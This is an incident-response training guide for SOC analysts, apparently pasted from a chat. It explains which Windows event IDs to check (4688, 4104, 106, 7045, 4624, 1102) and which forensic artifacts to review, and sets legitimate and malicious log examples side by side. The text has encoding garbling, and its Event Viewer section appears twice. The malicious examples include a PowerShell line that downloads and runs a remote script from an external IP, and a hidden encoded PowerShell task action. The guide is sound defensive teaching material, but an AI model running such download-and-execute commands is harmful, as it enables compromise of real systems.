At the end of Step 5 you must be able to say:
ğŸ’¬
â€œI validated persistence mechanisms using Autoruns by reviewing registry Run keys, startup folders, scheduled tasks, services, and WMI entries, identifying and disabling malicious auto-start entries that could relaunch malware after reboot.â€
If you canâ€™t say this confidently
â¡ï¸ system is NOT clean




ğŸ§  EVENT VIEWER â€” WHAT IT ADDS (WHY IT STILL MATTERS)
Think of Event Viewer as
ğŸ‘‰ ground-truth OS evidence
Even if EDR fails, logs donâ€™t lie (unless attacker cleared them)
Event Viewer answers
â€¢ Did something execute
â€¢ Did persistence get created
â€¢ Did it survive reboot
â€¢ Did attacker try to hide tracks

ğŸ§  CORE EVENT LOGS YOU MUST CHECK (IN ORDER)

1ï¸âƒ£ PROCESS CREATION â€” Event ID 4688 (MOST IMPORTANT)
ğŸ“ WHERE
Event Viewer
â†’ Windows Logs
â†’ Security
â†’ Event ID 4688

ğŸ”¹ WHAT IT SHOWS
â€¢ New process created
â€¢ Full process path
â€¢ Parent process
â€¢ User context

ğŸŸ¢ LEGIT EXAMPLE
Event ID: 4688
New Process Name:
C:\Program Files\Google\Chrome\Application\chrome.exe
Parent Process:
C:\Windows\explorer.exe
User: CORP\gagan

WHY LEGIT
âœ” Program Files path
âœ” Expected parent
âœ” Normal user activity

ğŸ”´ MALICIOUS EXAMPLE
Event ID: 4688
New Process Name:
C:\Users\Gagan\AppData\Roaming\update.exe
Parent Process:
C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
User: CORP\gagan

WHY MALICIOUS
âŒ AppData execution
âŒ Office spawning EXE
âŒ Confirms phishing chain

2ï¸âƒ£ POWERSHELL SCRIPT LOGGING â€” Event ID 4104
ğŸ“ WHERE
Event Viewer
â†’ Applications and Services Logs
â†’ Microsoft
â†’ Windows
â†’ PowerShell
â†’ Operational

ğŸ”¹ WHAT IT SHOWS
â€¢ Actual PowerShell script content
â€¢ Decoded commands (sometimes)

ğŸ”´ MALICIOUS EXAMPLE
Event ID: 4104
Script Block:
IEX(New-Object Net.WebClient).DownloadString('http://185.231.154.22/payload.ps1')

WHY MALICIOUS
âŒ Download + execute
âŒ External IP
âŒ In-memory execution

ğŸŸ¢ LEGIT EXAMPLE
Event ID: 4104
Script Block:
Get-ADUser -Filter *

âœ” Admin activity
âœ” No obfuscation

3ï¸âƒ£ SCHEDULED TASK CREATION â€” Event ID 106 / 140
ğŸ“ WHERE
Event Viewer
â†’ Applications and Services Logs
â†’ Microsoft
â†’ Windows
â†’ TaskScheduler
â†’ Operational


ğŸ”´ MALICIOUS EXAMPLE
Event ID: 106
Task Name: UpdateCheck
Action:
powershell.exe -nop -w hidden -enc SQBFAFgA

WHY MALICIOUS
âŒ Encoded PowerShell
âŒ Persistence confirmed

ğŸŸ¢ LEGIT EXAMPLE
Task Name: Adobe Acrobat Update Task
Action:
"C:\Program Files\Common Files\Adobe\ARM\AdobeARM.exe"


4ï¸âƒ£ SERVICE INSTALLATION â€” Event ID 7045
ğŸ“ WHERE
Event Viewer
â†’ Windows Logs
â†’ System
â†’ Event ID 7045


ğŸ”´ MALICIOUS EXAMPLE
Service Name: WindowsUpdateSvc
Service File Name:
C:\Users\Public\winupdate.exe

WHY MALICIOUS
âŒ Fake Microsoft name
âŒ User directory
âŒ Auto-start

ğŸŸ¢ LEGIT EXAMPLE
Service Name: CrowdStrike Falcon Sensor
Service File:
C:\Program Files\CrowdStrike\CSAgent.exe


5ï¸âƒ£ LOGON ACTIVITY â€” Event ID 4624 / 4625
ğŸ“ WHERE
Event Viewer
â†’ Windows Logs
â†’ Security

ğŸ”¹ WHY CHECK
â€¢ Malware using stolen creds
â€¢ Suspicious logons after infection

ğŸ”´ RED FLAG EXAMPLE
Event ID: 4624
Logon Type: 3
Account: CORP\gagan
Source IP: 10.0.0.99

WHY SUSPICIOUS
âŒ Network logon from another host
âŒ Possible lateral movement

6ï¸âƒ£ LOG CLEARING ATTEMPTS â€” Event ID 1102
ğŸ“ WHERE
Windows Logs
â†’ Security


ğŸ”´ MALICIOUS EXAMPLE
Event ID: 1102
The audit log was cleared
User: CORP\gagan

WHY MALICIOUS
âŒ Attackers clearing tracks
âŒ Very strong compromise indicator

ğŸ§  NOW â€” MISSING AREAS MOST SOC ANALYSTS FORGET (IMPORTANT LIST)
Below is a checklist of whatâ€™s STILL left, even after Event Viewer.

ğŸ”¹ A. WINDOWS PREFETCH
ğŸ“ Path
C:\Windows\Prefetch\

WHY
â€¢ Confirms execution even if file deleted
â€¢ Shows first run time
Example
UPDATE.EXE-3A9F2C1B.pf


ğŸ”¹ B. AMCACHE (PROGRAM EXECUTION HISTORY)
ğŸ“ Registry
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Amcache

WHY
â€¢ Shows executed binaries
â€¢ Survives reboot

ğŸ”¹ C. SHIMCACHE (COMPATIBILITY CACHE)
WHY
â€¢ Records executed files
â€¢ Useful if attacker deleted payload

ğŸ”¹ D. RECENT FILES / LNK FILES
ğŸ“ Paths
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Recent\

WHY
â€¢ Confirms user interaction
â€¢ Phishing execution proof

ğŸ”¹ E. DNS CACHE (LOCAL)
Command
ipconfig /displaydns

WHY
â€¢ Shows contacted domains
â€¢ Even if EDR missed DNS

ğŸ”¹ F. BROWSER ARTIFACTS
WHY
â€¢ Phishing download source
â€¢ Malicious URL
Check
â€¢ Downloads history
â€¢ Extension installs

ğŸ”¹ G. MEMORY-ONLY ATTACKS (LIMITATION NOTE)
WHY
â€¢ Fileless malware leaves no file
â€¢ Relies on logs + behavior
This is why
EDR + Event Viewer + Autoruns = required

ğŸ”¹ H. EDR TELEMETRY GAPS (REALITY)
EDR can miss
â€¢ Offline endpoints
â€¢ Short-lived processes
â€¢ WMI triggers
Which is why
Sysinternals + Event Viewer matter

ğŸ§  FINAL â€œNOTHING MISSEDâ€ CHECKLIST
Before closing an incident, you should be able to say YES to all ğŸ‘‡
âœ” EDR alert analyzed
âœ” Hash + path validated
âœ” Runtime validated (Process Explorer)
âœ” Persistence validated (Autoruns)
âœ” Reboot tested
âœ” Event Viewer checked (4688, 4104, 7045, 106, 4624, 1102)
âœ” No reappearance
If any âŒ
â¡ï¸ DO NOT CLOSE

ğŸ§  FINAL SOC-LEVEL STATEMENT (USE THIS)
â€œI validated the incident using EDR telemetry, live process inspection, persistence enumeration, and Windows event logs to ensure no residual execution or auto-start mechanisms remained after remediation.â€


Good catch â€” this is the right question to ask at the end, not the beginning ğŸ‘
At this point, we already covered EDR â†’ Process Explorer â†’ Autoruns
Now Iâ€™ll do TWO THINGS clearly:
1ï¸âƒ£ Event Viewer â€” what to check, exact logs, legit vs red flag, why
2ï¸âƒ£ List ALL remaining areas juniors usually MISS (so nothing is left)
No skipping. This is the final completeness layer.

ğŸ§  EVENT VIEWER â€” WHAT IT ADDS (WHY IT STILL MATTERS)
Think of Event Viewer as
ğŸ‘‰ ground-truth OS evidence
Even if EDR fails, logs donâ€™t lie (unless attacker cleared them)
Event Viewer answers
â€¢ Did something execute
â€¢ Did persistence get created
â€¢ Did it survive reboot
â€¢ Did attacker try to hide tracks

ğŸ§  CORE EVENT LOGS YOU MUST CHECK (IN ORDER)

1ï¸âƒ£ PROCESS CREATION â€” Event ID 4688 (MOST IMPORTANT)
ğŸ“ WHERE
Event Viewer
â†’ Windows Logs
â†’ Security
â†’ Event ID 4688

ğŸ”¹ WHAT IT SHOWS
â€¢ New process created
â€¢ Full process path
â€¢ Parent process
â€¢ User context

ğŸŸ¢ LEGIT EXAMPLE
Event ID: 4688
New Process Name:
C:\Program Files\Google\Chrome\Application\chrome.exe
Parent Process:
C:\Windows\explorer.exe
User: CORP\gagan

WHY LEGIT
âœ” Program Files path
âœ” Expected parent
âœ” Normal user activity

ğŸ”´ MALICIOUS EXAMPLE
Event ID: 4688
New Process Name:
C:\Users\Gagan\AppData\Roaming\update.exe
Parent Process:
C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
User: CORP\gagan

WHY MALICIOUS
âŒ AppData execution
âŒ Office spawning EXE
âŒ Confirms phishing chain

2ï¸âƒ£ POWERSHELL SCRIPT LOGGING â€” Event ID 4104
ğŸ“ WHERE
Event Viewer
â†’ Applications and Services Logs
â†’ Microsoft
â†’ Windows
â†’ PowerShell
â†’ Operational

ğŸ”¹ WHAT IT SHOWS
â€¢ Actual PowerShell script content
â€¢ Decoded commands (sometimes)

ğŸ”´ MALICIOUS EXAMPLE
Event ID: 4104
Script Block:
IEX(New-Object Net.WebClient).DownloadString('http://185.231.154.22/payload.ps1')

WHY MALICIOUS
âŒ Download + execute
âŒ External IP
âŒ In-memory execution

ğŸŸ¢ LEGIT EXAMPLE
Event ID: 4104
Script Block:
Get-ADUser -Filter *

âœ” Admin activity
âœ” No obfuscation

3ï¸âƒ£ SCHEDULED TASK CREATION â€” Event ID 106 / 140
ğŸ“ WHERE
Event Viewer
â†’ Applications and Services Logs
â†’ Microsoft
â†’ Windows
â†’ TaskScheduler
â†’ Operational


ğŸ”´ MALICIOUS EXAMPLE
Event ID: 106
Task Name: UpdateCheck
Action:
powershell.exe -nop -w hidden -enc SQBFAFgA

WHY MALICIOUS
âŒ Encoded PowerShell
âŒ Persistence confirmed

ğŸŸ¢ LEGIT EXAMPLE
Task Name: Adobe Acrobat Update Task
Action:
"C:\Program Files\Common Files\Adobe\ARM\AdobeARM.exe"


4ï¸âƒ£ SERVICE INSTALLATION â€” Event ID 7045
ğŸ“ WHERE
Event Viewer
â†’ Windows Logs
â†’ System
â†’ Event ID 7045


ğŸ”´ MALICIOUS EXAMPLE
Service Name: WindowsUpdateSvc
Service File Name:
C:\Users\Public\winupdate.exe

WHY MALICIOUS
âŒ Fake Microsoft name
âŒ User directory
âŒ Auto-start

ğŸŸ¢ LEGIT EXAMPLE
Service Name: CrowdStrike Falcon Sensor
Service File:
C:\Program Files\CrowdStrike\CSAgent.exe


5ï¸âƒ£ LOGON ACTIVITY â€” Event ID 4624 / 4625
ğŸ“ WHERE
Event Viewer
â†’ Windows Logs
â†’ Security

ğŸ”¹ WHY CHECK
â€¢ Malware using stolen creds
â€¢ Suspicious logons after infection

ğŸ”´ RED FLAG EXAMPLE
Event ID: 4624
Logon Type: 3
Account: CORP\gagan
Source IP: 10.0.0.99

WHY SUSPICIOUS
âŒ Network logon from another host
âŒ Possible lateral movement

6ï¸âƒ£ LOG CLEARING ATTEMPTS â€” Event ID 1102
ğŸ“ WHERE
Windows Logs
â†’ Security


ğŸ”´ MALICIOUS EXAMPLE
Event ID: 1102
The audit log was cleared
User: CORP\gagan

WHY MALICIOUS
âŒ Attackers clearing tracks
âŒ Very strong compromise indicator

ğŸ§  NOW â€” MISSING AREAS MOST SOC ANALYSTS FORGET (IMPORTANT LIST)
Below is a checklist of whatâ€™s STILL left, even after Event Viewer.

ğŸ”¹ A. WINDOWS PREFETCH
ğŸ“ Path
C:\Windows\Prefetch\

WHY
â€¢ Confirms execution even if file deleted
â€¢ Shows first run time
Example
UPDATE.EXE-3A9F2C1B.pf


ğŸ”¹ B. AMCACHE (PROGRAM EXECUTION HISTORY)
ğŸ“ Registry
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Amcache

WHY
â€¢ Shows executed binaries
â€¢ Survives reboot

ğŸ”¹ C. SHIMCACHE (COMPATIBILITY CACHE)
WHY
â€¢ Records executed files
â€¢ Useful if attacker deleted payload

ğŸ”¹ D. RECENT FILES / LNK FILES
ğŸ“ Paths
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Recent\

WHY
â€¢ Confirms user interaction
â€¢ Phishing execution proof

ğŸ”¹ E. DNS CACHE (LOCAL)
Command
ipconfig /displaydns

WHY
â€¢ Shows contacted domains
â€¢ Even if EDR missed DNS

ğŸ”¹ F. BROWSER ARTIFACTS
WHY
â€¢ Phishing download source
â€¢ Malicious URL
Check
â€¢ Downloads history
â€¢ Extension installs

ğŸ”¹ G. MEMORY-ONLY ATTACKS (LIMITATION NOTE)
WHY
â€¢ Fileless malware leaves no file
â€¢ Relies on logs + behavior
This is why
EDR + Event Viewer + Autoruns = required

ğŸ”¹ H. EDR TELEMETRY GAPS (REALITY)
EDR can miss
â€¢ Offline endpoints
â€¢ Short-lived processes
â€¢ WMI triggers
Which is why
Sysinternals + Event Viewer matter

ğŸ§  FINAL â€œNOTHING MISSEDâ€ CHECKLIST
Before closing an incident, you should be able to say YES to all ğŸ‘‡
âœ” EDR alert analyzed
âœ” Hash + path validated
âœ” Runtime validated (Process Explorer)
âœ” Persistence validated (Autoruns)
âœ” Reboot tested
âœ” Event Viewer checked (4688, 4104, 7045, 106, 4624, 1102)
âœ” No reappearance
If any âŒ
â¡ï¸ DO NOT CLOSE

ğŸ§  FINAL SOC-LEVEL STATEMENT (USE THIS)
â€œI validated the incident using EDR telemetry, live process inspection, persistence enumeration, and Windows event logs to ensure no residual execution or auto-start mechanisms remained after remediation.â€

